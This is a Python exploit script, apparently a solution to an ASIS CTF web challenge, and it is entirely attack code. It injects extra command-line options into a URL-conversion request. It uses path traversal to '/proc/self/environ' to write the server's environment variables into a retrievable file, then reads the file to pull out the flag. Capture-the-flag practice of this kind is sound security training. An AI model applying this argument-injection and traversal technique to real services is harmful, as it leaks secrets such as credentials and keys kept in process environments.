import requests
import time
import json

target = 'http://asciiart.asisctf.com:9000'

# Get Session ID (index does not set session. Go for /flag at first)
s = requests.Session()
s.get(f'{target}/flag')

session_cookie = s.cookies['connect.sid']
session_id = session_cookie.split('.')[0][4:]

print('Session ID: "{}"'.format(session_cookie.split('.')[0][4:].strip()))

headers = {
    'Connection': 'keep-alive',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    # 'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': f'{target}',
    'Referer': f'{target}/',
    'Accept-Language': 'en-US,en;q=0.9',
}

env_file = '../../../../../../../../../../proc/self/environ'
title_payload = f'--html-title="anyshit|{session_id}|{env_file}|hello'
attack_file = 'neptunian0'+'n'*22
output_paload = f'--output=./request/{attack_file}'

data = {
    "url": [
        "https://images.all-free-download.com/images/graphiclarge/animal_pictures_08_hd_picture_168987.jpg",
        "--html",
        title_payload,
        output_paload
    ]
}

response = s.post(f'{target}/request', headers=headers, json=data, verify=False)

print(response.status_code)
print(response.text)

time.sleep(2)

response = s.get(f'{target}/request/{attack_file}')

print(response.status_code)
print(response.text)

env_result = json.loads(response.text)['result']

print(env_result)
position = env_result.find("FLAG=")
print('\n\n', env_result[position:position+100])
